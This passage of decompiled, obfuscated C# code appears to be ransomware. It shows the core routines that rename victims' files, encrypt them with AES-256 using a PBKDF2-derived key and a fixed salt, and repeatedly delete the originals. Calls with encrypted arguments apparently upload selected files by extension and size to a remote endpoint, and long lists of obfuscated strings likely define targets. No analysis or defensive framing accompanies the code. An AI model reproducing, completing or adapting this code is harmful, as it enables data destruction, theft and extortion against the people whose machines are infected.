						continue;
					}
					goto IL_08b5;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.EndsWith(CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe))
				{
					goto IL_08b5;
				}
			}
			catch (Exception)
			{
				goto IL_08b5;
			}
			if (!PKEevhItGR.Contains(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj))
			{
				if (EYxaInlnKpK == HLWpvTFsJHjPW.getString_0(107396979))
				{
					try
					{
						if (KPQDOzwtmVFOx.hsjTIvpOst(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj))
						{
							KPQDOzwtmVFOx.lkWDWVGEltLMinY(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
						}
					}
					catch
					{
					}
				}
				PKEevhItGR.Add(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
				if (!xtzwHGpcURO.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj)))
				{
					xtzwHGpcURO.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj));
				}
				OODPURvlNpeQk(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (AreaxgrYTj)
						{
							try
							{
								File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + HLWpvTFsJHjPW.getString_0(107406508) + ex2.Message + HLWpvTFsJHjPW.getString_0(107397174));
							}
							catch (Exception)
							{
							}
						}
						MtUrEdDRDzL++;
						goto end_IL_0117_2;
					}
					if (EcxEPMzKnUKdFyvU == HLWpvTFsJHjPW.getString_0(107396979) && new FileInfo(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj).Length > Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
							{
								if (XszgYccOIzBT)
								{
									CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe = HvklvwSSvrVzvZd + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe;
								}
								File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe);
							}
						}
						catch (Exception ex4)
						{
							if (AreaxgrYTj)
							{
								try
								{
									File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + HLWpvTFsJHjPW.getString_0(107406479) + ex4.Message + HLWpvTFsJHjPW.getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							MtUrEdDRDzL++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
						{
							CS_0024_003C_003E8__locals0.MaaFvhEKHjUj += CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe;
						}
						if (dtpyECacgdgV == HLWpvTFsJHjPW.getString_0(107396979))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in MYtmFoSEPowjeCH)
								{
									if (CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.ukpRGssWFaai.DBqdIPWNdhJbe) && YcDZJAXfkcwFEP == HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107396985))
									{
										if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj).Length)
										{
											try
											{
												aOlPpFtnUBXreNv.oHaBhkBqIiP(HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107392321), HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107392316), HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107392271), CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.ToLower().EndsWith(item3) && YcDZJAXfkcwFEP == HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107396838))
									{
										try
										{
											aOlPpFtnUBXreNv.oHaBhkBqIiP(HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107392321), HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107392316), HLWpvTFsJHjPW.ztbWhKTEeeLEH.getString_0(107392271), CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
						string s = mIIgQsRoPFcf.lAQgyDpGyMnN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (rrRVvypnQbGQM == HLWpvTFsJHjPW.getString_0(107396832))
						{
							byte[] array = null;
							byte[] byte_ = YuMGwWVrDuXKA.rQKmlPLmPLw(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024);
							if (!YuMGwWVrDuXKA.KGbVnsOVmaox(gGvXHaVXPnSt: (!jUTdQQEeFeYZhnmcv) ? (fpnZuwWWrCf ? YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fpnZuwWWrCf ? VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZXZtbOtOvaKKAi: CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, EHaoPciFCiUco: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!fpnZuwWWrCf)
						{
							if (!HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, tKbCgjZzNwIevCY, CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, tKbCgjZzNwIevCY, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (XszgYccOIzBT)
						{
							CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe = HvklvwSSvrVzvZd + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe;
						}
						string text2 = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
						string s2 = mIIgQsRoPFcf.lAQgyDpGyMnN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
						{
							if (!YBbHALckKieZ)
							{
								if (!fpnZuwWWrCf)
								{
									yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, smKHsmzCQQJ);
								}
								else
								{
									yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!fpnZuwWWrCf)
									{
										zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, smKHsmzCQQJ);
									}
									else
									{
										zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (AreaxgrYTj)
									{
										try
										{
											File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + HLWpvTFsJHjPW.getString_0(107389151) + ex9.Message + HLWpvTFsJHjPW.getString_0(107397174));
										}
										catch (Exception)
										{
										}
									}
									MtUrEdDRDzL++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!YBbHALckKieZ)
						{
							if (!fpnZuwWWrCf)
							{
								yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + HLWpvTFsJHjPW.getString_0(107389160), smKHsmzCQQJ);
							}
							else
							{
								yHqsuJKABWzrvG(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + HLWpvTFsJHjPW.getString_0(107389160), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!fpnZuwWWrCf)
								{
									zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, smKHsmzCQQJ);
								}
								else
								{
									zLBnoSiaCsn(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (AreaxgrYTj)
								{
									try
									{
										File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + HLWpvTFsJHjPW.getString_0(107389151) + ex12.Message + HLWpvTFsJHjPW.getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								MtUrEdDRDzL++;
								return;
							}
						}
						if (fpnZuwWWrCf)
						{
							if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
							{
								rEFsTTbNdvhUnSu(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, bytes2);
							}
							else
							{
								rEFsTTbNdvhUnSu(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_08b5;
			IL_08b5:
			CS_0024_003C_003E8__locals0.DyzteUZXPQXh.Remove(CS_0024_003C_003E8__locals0.MaaFvhEKHjUj);
		});
	}

	private static void WeqypgSexEHO(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (dtpyECacgdgV == getString_0(107396962))
					{
						foreach (string item in MYtmFoSEPowjeCH)
						{
							if (string_0.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396962))
							{
								if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396815))
							{
								try
								{
									aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389143)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389143), getString_0(107392185)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void zLBnoSiaCsn(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (dtpyECacgdgV == getString_0(107396962))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in MYtmFoSEPowjeCH)
			{
				if (string_0.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396962))
				{
					if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396815))
				{
					try
					{
						aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = VoJDuYIUixwR.DIjMZWEAFCxXcE(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		YIvQxgIKBLMzUZ++;
	}

	private static void yHqsuJKABWzrvG(string string_0, string string_1, byte[] byte_0)
	{
		vCYDHRWOhOXp CS_0024_003C_003E8__locals0 = new vCYDHRWOhOXp();
		CS_0024_003C_003E8__locals0.aWoiCVCXftar = string_0;
		CS_0024_003C_003E8__locals0.gDpoNjhTmVraF = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string gDpoNjhTmVraF = CS_0024_003C_003E8__locals0.gDpoNjhTmVraF;
			FileStream fileStream = new FileStream(gDpoNjhTmVraF, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (mLyGnpszUKM == getString_0(107396962))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.aWoiCVCXftar, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.aWoiCVCXftar, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.aWoiCVCXftar, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.gDpoNjhTmVraF.Length > 0)
				{
					if (dtpyECacgdgV == getString_0(107396962))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.aWoiCVCXftar, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in MYtmFoSEPowjeCH)
						{
							if (CS_0024_003C_003E8__locals0.aWoiCVCXftar.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396962))
							{
								if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), CS_0024_003C_003E8__locals0.aWoiCVCXftar);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.aWoiCVCXftar.ToLower().EndsWith(item) && YcDZJAXfkcwFEP == getString_0(107396815))
							{
								try
								{
									aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), CS_0024_003C_003E8__locals0.aWoiCVCXftar);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.aWoiCVCXftar);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.gDpoNjhTmVraF.EndsWith(getString_0(107389143)))
					{
						File.Move(CS_0024_003C_003E8__locals0.gDpoNjhTmVraF, CS_0024_003C_003E8__locals0.gDpoNjhTmVraF.Replace(getString_0(107389143), getString_0(107392185)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.gDpoNjhTmVraF))
							{
								File.Delete(CS_0024_003C_003E8__locals0.gDpoNjhTmVraF);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(RqqYTsMuxEQen, getString_0(107389907) + CS_0024_003C_003E8__locals0.aWoiCVCXftar + getString_0(107389134) + ex2.Message + getString_0(107397157));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = nPlsLUdMzje;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				sYcbkIpQPZ(pimTPtzgsj(getString_0(107389081)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> alRVdSbJkGYahty = AlRVdSbJkGYahty;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				sYcbkIpQPZ(pimTPtzgsj(getString_0(107389100)), string_0);
			};
		}
		Parallel.ForEach(alRVdSbJkGYahty, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (zClvTeYQjHuj == getString_0(107396962))
		{
			string[] jTojuxgSqdxwybF = JTojuxgSqdxwybF;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					sYcbkIpQPZ(pimTPtzgsj(getString_0(107389100)), getString_0(107389043) + string_0 + getString_0(107389066));
				};
			}
			Parallel.ForEach(jTojuxgSqdxwybF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!oPrbscpupajC().Contains(getString_0(107389261)))
		{
			amlUMUnhkwAkBpE(rJEEtUlxByvk);
		}
		else
		{
			List<string> aNQRNsZXZzDia = ANQRNsZXZzDia;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					sYcbkIpQPZ(pimTPtzgsj(zujFUufZIGQ(getString_0(107389061))), string_0);
				};
			}
			Parallel.ForEach(aNQRNsZXZzDia, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> dYjGYBZIQrg = DYjGYBZIQrg;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				sYcbkIpQPZ(pimTPtzgsj(getString_0(107389548)), string_0);
			};
		}
		Parallel.ForEach(dYjGYBZIQrg, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		sYcbkIpQPZ(pimTPtzgsj(getString_0(107389081)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		sYcbkIpQPZ(pimTPtzgsj(getString_0(107389100)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		sYcbkIpQPZ(pimTPtzgsj(getString_0(107389100)), getString_0(107389043) + string_0 + getString_0(107389066));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		sYcbkIpQPZ(pimTPtzgsj(zujFUufZIGQ(getString_0(107389061))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		sYcbkIpQPZ(pimTPtzgsj(getString_0(107389548)), string_0);
	}

	static XpwFCiWTIXog()
	{
		Strings.CreateGetStringDelegate(typeof(XpwFCiWTIXog));
		WAdQAnaatuGbK = getString_0(107392393);
		smKHsmzCQQJ = null;
		LEpdgEkMnryDWG = getString_0(107396815);
		xpRslkPIZNkPFMe = getString_0(107389499);
		veKjcfDmQAYZ = new List<string>();
		RYudWXnclT = new List<string>();
		BgnlLuLqOz = getString_0(107396815);
		sYegfhFfwOKgPE = getString_0(107392185);
		PaVhfbLxCUlIiWK = getString_0(107392185);
		SsNNXOsHyBWIenb = getString_0(107396815);
		KqpMDdHLWmUkH = 0;
		EYxaInlnKpK = getString_0(107396815);
		BBuHVBrXwLa = getString_0(107396815);
		ioQYLomBXyIPev = getString_0(107396815);
		MMJbfQTrQc = getString_0(107389486);
		BytIIpyxDIyEs = getString_0(107396815);
		YEwFYxtdSZsAST = getString_0(107396815);
		JgxaqlKhVAqgR = getString_0(107396815);
		JKQAxAGQpoLcsE = getString_0(107396815);
		sntjXMwdLKy = new List<string>
		{
			pimTPtzgsj(getString_0(107389513)),
			pimTPtzgsj(getString_0(107389464)),
			pimTPtzgsj(getString_0(107389471)),
			pimTPtzgsj(getString_0(107389422)),
			pimTPtzgsj(getString_0(107389397)),
			pimTPtzgsj(getString_0(107389372)),
			pimTPtzgsj(getString_0(107389387)),
			pimTPtzgsj(getString_0(107389330)),
			pimTPtzgsj(getString_0(107389305)),
			pimTPtzgsj(getString_0(107389312)),
			pimTPtzgsj(getString_0(107388751)),
			pimTPtzgsj(getString_0(107388726)),
			pimTPtzgsj(getString_0(107388733))
		};
		xtzwHGpcURO = new List<string>();
		KolSXtENysFD = getString_0(107396815);
		baEpQVmPTeoPfx = getString_0(107396962);
		mDRSmgKFSau = getString_0(107396815);
		PKEevhItGR = new List<string>();
		FjCEaJsphNfpw = getString_0(107396815);
		UcRKDGBfJAusJI = getString_0(107388708);
		wGSokduaWV = getString_0(107396962);
		ljFbFcwSKT = getString_0(107396815);
		mnMqgAfSusLgJ = new List<string>
		{
			pimTPtzgsj(getString_0(107388627)),
			pimTPtzgsj(getString_0(107388594)),
			pimTPtzgsj(getString_0(107388561)),
			pimTPtzgsj(getString_0(107388528)),
			pimTPtzgsj(getString_0(107389007)),
			pimTPtzgsj(getString_0(107388978)),
			pimTPtzgsj(getString_0(107388921)),
			pimTPtzgsj(getString_0(107388892)),
			pimTPtzgsj(getString_0(107388847)),
			pimTPtzgsj(getString_0(107388782)),
			pimTPtzgsj(getString_0(107388237)),
			pimTPtzgsj(getString_0(107388236)),
			pimTPtzgsj(getString_0(107388203)),
			pimTPtzgsj(getString_0(107388142)),
			pimTPtzgsj(getString_0(107388113)),
			pimTPtzgsj(getString_0(107388104)),
			pimTPtzgsj(getString_0(107388063)),
			pimTPtzgsj(getString_0(107388518)),
			pimTPtzgsj(getString_0(107388437)),
			pimTPtzgsj(getString_0(107388404)),
			pimTPtzgsj(getString_0(107388375)),
			pimTPtzgsj(getString_0(107388334)),
			pimTPtzgsj(getString_0(107388325)),
			pimTPtzgsj(getString_0(107388292)),
			pimTPtzgsj(getString_0(107387699)),
			pimTPtzgsj(getString_0(107387642)),
			pimTPtzgsj(getString_0(107387601)),
			pimTPtzgsj(getString_0(107387572)),
			pimTPtzgsj(getString_0(107387563)),
			pimTPtzgsj(getString_0(107387986)),
			pimTPtzgsj(getString_0(107387921)),
			pimTPtzgsj(getString_0(107387864)),
			pimTPtzgsj(getString_0(107387799)),
			pimTPtzgsj(getString_0(107387782)),
			pimTPtzgsj(getString_0(107387205)),
			pimTPtzgsj(getString_0(107387148)),
			pimTPtzgsj(getString_0(107387115)),
			pimTPtzgsj(getString_0(107387074)),
			pimTPtzgsj(getString_0(107387001)),
			pimTPtzgsj(getString_0(107387500)),
			pimTPtzgsj(getString_0(107387439)),
			pimTPtzgsj(getString_0(107387374)),
			pimTPtzgsj(getString_0(107387365)),
			pimTPtzgsj(getString_0(107387332)),
			pimTPtzgsj(getString_0(107387259)),
			pimTPtzgsj(getString_0(107386730)),
			pimTPtzgsj(getString_0(107386685)),
			pimTPtzgsj(getString_0(107386580)),
			pimTPtzgsj(getString_0(107386567)),
			pimTPtzgsj(getString_0(107386490)),
			pimTPtzgsj(getString_0(107386957)),
			pimTPtzgsj(getString_0(107386948)),
			pimTPtzgsj(getString_0(107386843)),
			pimTPtzgsj(getString_0(107386846)),
			pimTPtzgsj(getString_0(107386773)),
			pimTPtzgsj(getString_0(107386196)),
			pimTPtzgsj(getString_0(107386183)),
			pimTPtzgsj(getString_0(107386154)),
			pimTPtzgsj(getString_0(107386109)),
			pimTPtzgsj(getString_0(107386012)),
			pimTPtzgsj(getString_0(107386015)),
			pimTPtzgsj(getString_0(107386470)),
			pimTPtzgsj(getString_0(107386405)),
			pimTPtzgsj(getString_0(107386332)),
			pimTPtzgsj(getString_0(107386335)),
			pimTPtzgsj(getString_0(107386262)),
			pimTPtzgsj(getString_0(107385701)),
			pimTPtzgsj(getString_0(107385640)),
			pimTPtzgsj(getString_0(107385567)),
			pimTPtzgsj(getString_0(107385490)),
			pimTPtzgsj(getString_0(107385457)),
			pimTPtzgsj(getString_0(107385960)),
			pimTPtzgsj(getString_0(107385851)),
			pimTPtzgsj(getString_0(107385806)),
			pimTPtzgsj(getString_0(107385717)),
			pimTPtzgsj(getString_0(107385188)),
			pimTPtzgsj(getString_0(107385159)),
